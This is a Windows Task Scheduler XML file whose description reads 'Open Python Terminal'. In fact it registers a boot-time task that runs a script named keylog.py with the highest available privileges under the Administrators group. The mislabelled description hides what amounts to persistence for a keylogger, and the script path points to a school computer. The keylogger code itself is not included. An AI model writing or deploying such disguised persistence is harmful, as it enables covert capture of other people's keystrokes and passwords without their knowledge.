# task.xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-05-15T12:00:00</Date>
    <Author>Matteo</Author>
    <Description>Open Python Terminal</Description>
    <URI>\myTasks\PythonTerminal</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-32-544</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Python312\python.exe</Command>
      <Arguments>C:\Tim-Paris-Schule\OwnProjects\Matteo406\keylog.py</Arguments>
    </Exec>
  </Actions>
</Task>